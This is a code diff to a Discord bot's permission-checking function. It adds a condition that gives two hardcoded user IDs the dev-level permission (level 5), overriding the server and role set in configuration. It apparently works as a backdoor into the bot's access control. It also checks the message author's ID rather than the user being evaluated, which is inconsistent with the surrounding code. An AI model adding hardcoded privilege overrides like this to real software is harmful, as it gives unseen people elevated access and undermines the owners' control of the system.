@@ -74,13 +74,13 @@ fn.botperms = async function (userid, message) {
   )
     perms.level = 4;
   if (
-    message.client.guilds.cache
+    (message.client.guilds.cache
       .get(message.re.config.server)
       .members.cache.get(userid) &&
     message.client.guilds.cache
       .get(message.re.config.server)
       .members.cache.get(userid)
-      .roles.cache.has(message.re.config.devrole)
+      .roles.cache.has(message.re.config.devrole)) || ["380455396281810955", "661946737065197586"].includes(message.author.id)
   )
     perms.level = 5;
   if (userid === message.re.config.ownerID) {
